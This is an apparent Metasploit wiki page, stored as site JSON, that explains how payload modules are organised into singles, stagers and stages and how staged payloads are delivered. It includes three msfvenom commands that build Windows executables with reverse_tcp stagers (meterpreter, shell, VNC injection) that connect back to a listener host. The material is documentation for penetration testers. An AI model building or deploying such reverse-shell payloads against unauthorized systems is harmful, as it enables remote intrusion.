{"componentChunkName":"component---src-templates-wiki-template-tsx","path":"/wiki/Misc/How-payloads-work","result":{"data":{"markdownRemark":{"id":"3acfff6a-99fa-5f5f-886c-0ded7a842f00","frontmatter":{"title":"How payloads work","root":null},"html":"<h1 id=\"how-payloads-work\" style=\"position:relative;\"><a href=\"#how-payloads-work\" aria-label=\"how payloads work permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>How Payloads Work</h1>\n<p>Payload modules are stored in <code class=\"language-text\">modules/payloads/{singles,stages,stagers}/&lt;platform&gt;</code>. When the framework starts up, stages are combined with stagers to create a complete payload that you can use in exploits. Then, handlers are paired with payloads so the framework will know how to create sessions with a given communications mechanism.</p>\n<p>Payloads are given reference names that indicate all the pieces, like so:</p>\n<ul>\n<li>Staged payloads: <code class=\"language-text\">&lt;platform&gt;/[arch]/&lt;stage&gt;/&lt;stager&gt;</code></li>\n<li>Single payloads: <code class=\"language-text\">&lt;platform&gt;/[arch]/&lt;single&gt;</code></li>\n</ul>\n<p>This results in payloads like <code class=\"language-text\">windows/x64/meterpreter/reverse_tcp</code>. Breaking that down, the platform is <code class=\"language-text\">windows</code>, the architecture is <code class=\"language-text\">x64</code>, the final stage we're delivering is <code class=\"language-text\">meterpreter</code>, and the stager delivering it is <code class=\"language-text\">reverse_tcp</code>.</p>\n<p>Note that architecture is optional because in some cases it is either unnecessary or implied. An example is <code class=\"language-text\">php/meterpreter/reverse_tcp</code>. Arch is unneeded for PHP payloads because we're delivering interpreted code rather than native.</p>\n<h3 id=\"singles\" style=\"position:relative;\"><a href=\"#singles\" aria-label=\"singles permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Singles</h3>\n<p>Single payloads are fire-and-forget. They can create a communications mechanism with Metasploit, but they don't have to. An example of a scenario where you might want a single is when the target has no network access -- a fileformat exploit delivered via USB key is still possible.</p>\n<h3 id=\"stagers\" style=\"position:relative;\"><a href=\"#stagers\" aria-label=\"stagers permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Stagers</h3>\n<p>Stagers are a small stub designed to create some form of communication and then pass execution to the next stage. Using a stager solves two problems. First, it allows us to use a small payload initially to load up a larger payload with more functionality. Second, it makes it possible to separate the communications mechanism from the final stage so one payload can be used with multiple transports without duplicating code.</p>\n<h3 id=\"stages\" style=\"position:relative;\"><a href=\"#stages\" aria-label=\"stages permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Stages</h3>\n<p>Since the stager will have taken care of dealing with any size restrictions by allocating a big chunk of memory for us to run in, stages can be arbitrarily large. One advantage of that is the ability to write final-stage payloads in a higher-level language like C.</p>\n<h2 id=\"delivering-stages\" style=\"position:relative;\"><a href=\"#delivering-stages\" aria-label=\"delivering stages permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Delivering stages</h2>\n<ol>\n<li>\n<p>The IP address and port you want the payload to connect back to are embedded in the stager. As discussed above, all staged payloads are no more than a small stub that sets up communication and executes the next stage. When you create an executable using a staged payload, you're really just creating the stager. So the following commands would create functionally identical exe files:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msfvenom -f exe LHOST=192.168.1.1 -p windows/meterpreter/reverse_tcp\nmsfvenom -f exe LHOST=192.168.1.1 -p windows/shell/reverse_tcp\nmsfvenom -f exe LHOST=192.168.1.1 -p windows/vncinject/reverse_tcp</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>(Note that these are <em>functionally</em> identical -- there is a lot of randomization that goes into it so no two executables are exactly the same.)</p>\n</li>\n<li>\n<p>The Ruby side acts as a client using whichever transport mechanism was set up by the stager (e.g.: tcp, http, https).</p>\n<ul>\n<li>In the case of a shell stage, Metasploit will connect the remote process's stdio to your terminal when you interact with it.</li>\n<li>In the case of a [[Meterpreter]] stage, Metasploit will begin speaking the Meterpreter wire protocol.</li>\n</ul>\n</li>\n</ol>"}},"pageContext":{"id":"3acfff6a-99fa-5f5f-886c-0ded7a842f00"}}}